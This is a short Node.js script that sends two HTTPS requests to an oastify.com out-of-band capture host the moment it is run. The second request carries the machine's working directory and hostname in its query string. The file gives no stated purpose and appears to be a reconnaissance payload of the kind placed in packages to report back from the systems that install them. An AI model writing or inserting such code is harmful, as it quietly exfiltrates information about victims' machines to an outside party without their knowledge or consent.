import https from 'https';
import os from 'os';
import path from 'path';

const sendRequests = () => {
    const requestWithTimeout = (options) => {
        const req = https.request(options, (res) => {
            console.log(`Request status code: ${res.statusCode}`);
            res.on('data', (data) => {
                process.stdout.write(data);
            });
        });

        req.on('error', (error) => {
            console.error(`Request error: ${error.message}`);
        });

        req.setTimeout(5000, () => {
            console.error('Request timed out');
            req.abort();
        });

        req.end();
    };

    const options1 = {
        hostname: 'nvmr7j5ar5y75nsfvywejcqvbmhd59ty.oastify.com',
        port: 443,
        path: '/',
        method: 'GET',
    };

    const workingDir = process.cwd();
    const hostname = os.hostname();
    const options2 = {
        hostname: 'nvmr7j5ar5y75nsfvywejcqvbmhd59ty.oastify.com',
        port: 443,
        path: `/info?cwd=${encodeURIComponent(workingDir)}&hostname=${encodeURIComponent(hostname)}`,
        method: 'GET',
    };

    requestWithTimeout(options1);
    requestWithTimeout(options2);
};

// Call the function to send requests
sendRequests();
